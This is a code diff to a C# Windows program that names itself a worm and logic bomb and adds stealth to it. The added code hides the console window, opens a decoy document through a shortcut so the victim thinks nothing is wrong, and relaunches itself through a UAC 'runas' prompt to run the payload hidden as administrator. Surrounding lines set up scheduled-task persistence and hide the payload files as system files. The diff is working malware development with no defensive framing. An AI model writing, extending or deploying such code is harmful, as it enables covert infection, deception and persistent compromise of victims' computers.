@@ -7,6 +7,7 @@ using System.Management;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.Security.Principal; // Required for Admin check
 using System.Threading;
 using System.Threading.Tasks;
 using AuthenticationLevel = System.Management.AuthenticationLevel;
@@ -31,11 +32,24 @@ class Program
 
     private const string WORM_TASK_NAME = "Malicious_Worm";
     private const string LOGICBOMB_TASK_NAME = "Malicious_LogicBomb";
-
     private static string logFilePath;
+
+    // --- STEALTH: Imports to hide the console window ---
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    const int SW_HIDE = 0;
+    const int SW_SHOW = 5;
 
     static async Task Main(string[] args)
     {
+        // 1. Hide the console window immediately
+        var handle = GetConsoleWindow();
+        ShowWindow(handle, SW_HIDE);
+
         string baseDir = AppDomain.CurrentDomain.BaseDirectory;
         Directory.SetCurrentDirectory(baseDir);
 
@@ -43,9 +57,58 @@ class Program
         string logFileName = $"Worm_log_{timestamp}.log";
         logFilePath = Path.Combine(baseDir, logFileName);
 
+        // 2. Handle Decoy (If launched via LNK with arguments)
+        if (args.Length > 0)
+        {
+            string targetDoc = args[0];
+            if (System.IO.File.Exists(targetDoc))
+            {
+                try
+                {
+                    // Open the original document so the user thinks the shortcut worked
+                    Process.Start(new ProcessStartInfo(targetDoc) { UseShellExecute = true });
+                }
+                catch { }
+            }
+        }
+
+        // 3. Admin Privilege Check & Escalation
+        if (!IsAdministrator())
+        {
+            try
+            {
+                // Relaunch self with "runas" to trigger UAC
+                ProcessStartInfo proc = new ProcessStartInfo();
+                proc.UseShellExecute = true;
+                proc.WorkingDirectory = baseDir;
+                proc.FileName = Process.GetCurrentProcess().MainModule.FileName;
+                proc.Verb = "runas"; // This triggers the UAC prompt
+                // We do NOT pass args here, so the admin instance knows it's the payload runner, not the LNK handler
+
+                Process.Start(proc);
+
+                // Exit this non-admin instance. The user sees the doc open, and a UAC prompt.
+                // If they click Yes, the malware runs hidden as admin.
+                Environment.Exit(0);
+            }
+            catch
+            {
+                // If user clicks "No" on UAC, we stay in this process.
+                // We proceed with "Best Effort" execution (might fail persistence/logic bomb).
+                LogWarning("UAC denied. Running with limited privileges.");
+            }
+        }
+
+        // 4. Run the actual Malware Payload
+        await RunMalwarePayload(baseDir);
+    }
+
+    private static async Task RunMalwarePayload(string baseDir)
+    {
         LogToFile("========================================");
         LogToFile($"Worm started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
         LogToFile($"Process ID: {Process.GetCurrentProcess().Id}");
+        LogToFile($"Privileges: {(IsAdministrator() ? "ADMIN" : "USER")}");
         LogToFile($"Running from: {baseDir}");
         LogToFile("========================================");
 
@@ -83,6 +146,13 @@ class Program
             LogError($"Critical error in main loop: {ex.Message}");
             LogToFile($"Stack trace: {ex.StackTrace}");
         }
+    }
+
+    private static bool IsAdministrator()
+    {
+        var identity = WindowsIdentity.GetCurrent();
+        var principal = new WindowsPrincipal(identity);
+        return principal.IsInRole(WindowsBuiltInRole.Administrator);
     }
 
     // --- STEP 1: Duplicate the payload and return the path to the new EXE ---
@@ -129,7 +199,6 @@ class Program
     {
         try
         {
-            // A. Persist Worm
             string wormPath = Process.GetCurrentProcess().MainModule.FileName;
             if (CreateScheduledTask(WORM_TASK_NAME, wormPath))
             {
@@ -137,10 +206,9 @@ class Program
             }
             else
             {
-                LogWarning($"Failed to create Worm scheduled task.");
+                LogWarning($"Failed to create Worm scheduled task (Likely requires Admin).");
             }
 
-            // B. Persist Duplicated LogicBomb (if available)
             if (!string.IsNullOrEmpty(duplicateLogicBombPath) && System.IO.File.Exists(duplicateLogicBombPath))
             {
                 if (CreateScheduledTask(LOGICBOMB_TASK_NAME, duplicateLogicBombPath))
@@ -188,7 +256,6 @@ class Program
     {
         try
         {
-            // 1. List of specific files to hide in the root directory
             string[] filesToHide = {
                 WORM_EXE_NAME,
                 SHARED_CRYPTO_DLL,
@@ -204,19 +271,15 @@ class Program
                 }
             }
 
-            // 2. Hide the payload folder and its contents recursively
             string payloadPath = Path.Combine(directory, PAYLOAD_FOLDER_NAME);
             if (Directory.Exists(payloadPath))
             {
                 DirectoryInfo payloadDir = new DirectoryInfo(payloadPath);
-                // Hide the folder itself
                 payloadDir.Attributes = FileAttributes.Hidden | FileAttributes.System;
 
-                // Hide everything inside the payload folder
                 foreach (var file in payloadDir.GetFiles("*", SearchOption.AllDirectories))
                 {
                     string ext = file.Extension.ToLower();
-                    // Still exclude logs just in case they end up there
                     if (ext == ".log" || ext == ".txt") continue;
 
                     try { System.IO.File.SetAttributes(file.FullName, FileAttributes.Hidden | FileAttributes.System); } catch { }
